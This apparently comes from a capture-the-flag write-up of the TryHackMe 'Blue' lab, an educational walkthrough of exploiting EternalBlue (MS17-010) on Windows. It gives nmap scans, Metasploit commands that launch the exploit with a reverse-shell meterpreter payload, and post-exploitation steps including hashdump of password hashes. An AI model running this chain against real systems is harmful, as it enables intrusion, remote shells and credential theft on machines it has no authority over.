---
title: "TryHackMe – Blue"
date: 2026-01-20
tags: [windows, eternalblue, metasploit, beginner]
difficulty: Easy
description: "Exploit a Windows machine using the EternalBlue vulnerability (MS17-010)"
---

## Overview

Blue is a beginner-friendly Windows exploitation room focusing on the infamous EternalBlue vulnerability (MS17-010). This walkthrough will guide you through scanning, exploiting, and gaining access to a vulnerable Windows machine.

## Reconnaissance

First, let's scan the target machine to identify open ports and services:

```bash
nmap -sC -sV -oN nmap_initial.txt <TARGET_IP>
```

Key findings from the scan include SMB running on port 445, which is our primary target.

## Vulnerability Scanning

We can use Nmap's scripting engine to check for the MS17-010 vulnerability:

```bash
nmap -p 445 --script=smb-vuln-ms17-010 <TARGET_IP>
```

The scan confirms the machine is vulnerable to EternalBlue!

## Exploitation with Metasploit

Launch Metasploit Framework:

```bash
msfconsole
```

Search for and use the EternalBlue exploit:

```bash
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
exploit
```

## Post-Exploitation

Once you have a meterpreter session, you can:

1. Check your privileges:
```bash
getuid
```

2. Dump password hashes:
```bash
hashdump
```

3. Search for flags:
```bash
search -f flag*.txt
```

## Key Takeaways

- Always keep systems patched and updated
- SMB vulnerabilities can lead to complete system compromise
- Defense in depth is crucial - don't rely on a single security measure

## References

- [MS17-010 Security Bulletin](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [Metasploit Framework Documentation](https://www.metasploit.com/)
